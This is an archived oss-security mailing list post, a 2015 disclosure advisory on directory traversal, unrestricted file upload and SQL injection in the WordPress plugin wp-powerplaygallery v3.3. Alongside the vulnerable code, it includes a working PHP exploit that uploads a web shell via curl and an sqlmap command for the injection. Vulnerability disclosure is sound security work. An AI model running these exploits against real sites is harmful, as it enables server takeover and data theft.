@@ -1,0 +1,215 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Remote file upload vulnerability &amp; SQLi in wordpress plugin
+ wp-powerplaygallery v3.3</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="2">[&lt;prev]</a> <a href="4">[next&gt;]</a> <a href="../../../2015/07/20/1">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-id: &lt;4B83BB8E-8197-4530-816A-EF48BD586D89&#64;me.com&gt;
+Date: Sun, 12 Jul 2015 16:11:38 -0400
+From: "Larry W. Cashdollar" &lt;larry0&#64;...com&gt;
+To: Open Source Security &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: Remote file upload vulnerability &amp; SQLi in wordpress plugin
+ wp-powerplaygallery v3.3
+
+Title: Remote file upload vulnerability &amp; SQLi in wordpress plugin wp-powerplaygallery v3.3
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-27
+Download Site: <a href="https://wordpress.org/plugins/wp-powerplaygallery" rel="nofollow">https://wordpress.org/plugins/wp-powerplaygallery</a>
+Vendor: WP SlideShow
+Vendor Notified: 2015-06-29
+Advisory: <a href="http://www.vapid.dhs.org/advisory.php?v=132" rel="nofollow">http://www.vapid.dhs.org/advisory.php?v=132</a>
+Vendor Contact: plugins&#64;...dpress.org
+Description: This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and touch enabled version for ipad and iphones.
+Vulnerability:
+1. Ability to create directories out side of the upload path by using ../:
+Lines 56-59 of upload.php:
+
+56 // Create target dir
+57 if (!file_exists($targetDir)) {
+58         @mkdir($targetDir);
+59 }      
+
+2. Arbitrary file uploads to a path in the web root directory:
+Lines 138-160 of uploads.php don’t verify what types of files are allowed or where they should be placed:
+
+138 // Open temp file
+139 if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
+140         die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" :     "id"}');
+141 }
+142 
+143 if (!empty($_FILES)) {
+144         if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) {
+145                 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}    , "id" : "id"}');
+146         }
+147 
+148         // Read binary input stream and append it to temp file
+149         if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) {
+150                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."},     "id" : "id"}');
+151         }
+152 } else {
+153         if (!$in = @fopen("php://input", "rb")) {
+154                 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."},     "id" : "id"}');
+155         }
+156 }
+157 
+158 while ($buff = fread($in, 4096)) {
+159         fwrite($out, $buff);
+160 }
+
+3. Sql injection 
+Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are
+any GET/POST to albumid or name.
+
+131 $query = "INSERT INTO ".$wpdb-&gt;prefix."pp_images (`category_id`, `title`, `description`, `price`, `thumb`, `    image`, `status`, `order`, `creation_date` )
+132           VALUES (".$_REQUEST['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$_REQUEST    ['name']."',1,'','NULL')";
+133 
+134           $wpdb-&gt;query($query);
+135 
+
+CVEID:
+OSVDB:
+Exploit Code:
+	• &lt;?php
+	• /*Remote shell upload exploit for wp-powerplaygallery v3.3 */
+	• /*Larry W. Cashdollar @_larry0
+	• 6/27/2015
+	• albumid needs to be a numeric value matching an existing album number, 1 is probably a good start
+	• but you can enumerate these by using curl, and looking for redirect 301 responses:
+	• e.g. $ curl <a href="http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big" rel="nofollow">http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big</a>
+	• -&gt;301 exists else 404 doesn't.
+	• shell is <a href="http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php" rel="nofollow">http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php</a>
+	• */
+	•  
+	•  
+	• 	$target_url = '<a href="http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'" rel="nofollow">http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'</a>;
+	• 	$file_name_with_full_path = '/var/www/shell.php';
+	•  
+	•         echo "POST to $target_url $file_name_with_full_path";
+	• 	$post = array('albumid'=&gt;'foo' , 'name' =&gt; 'shell.php','file'=&gt;'&#64;...file_name_with_full_path);
+	•  
+	•         $ch = curl_init();
+	• 	curl_setopt($ch, CURLOPT_URL,$target_url);
+	• 	curl_setopt($ch, CURLOPT_POST,1);
+	• 	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	•         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+	• 	$result=curl_exec ($ch);
+	• 	curl_close ($ch);
+	•         echo "&lt;hr&gt;";
+	• 	echo $result;
+	•         echo "&lt;hr&gt;";
+	• ?&gt;
+SQLi PoC:
+$ sqlmap -u <a href="http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php" rel="nofollow">http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php</a> --data "albumid=1”  —dbms mysql</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
